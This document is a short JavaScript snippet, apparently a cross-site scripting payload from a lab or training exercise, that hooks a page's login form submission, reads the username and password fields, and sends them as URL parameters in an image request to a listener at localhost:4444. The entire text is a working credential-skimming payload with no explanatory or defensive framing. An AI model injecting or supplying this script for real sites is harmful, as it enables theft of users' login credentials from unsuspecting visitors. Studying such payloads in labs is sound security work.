<script>
	function InterceptForm() {
		var username = document.forms[0].elements[0].value;
		var password = document.forms[0].elements[1].value;
		new Image().src = "http://localhost:4444/?username="+username+"&password="+password;
	}
	document.forms[0].onsubmit = InterceptForm;
</script>
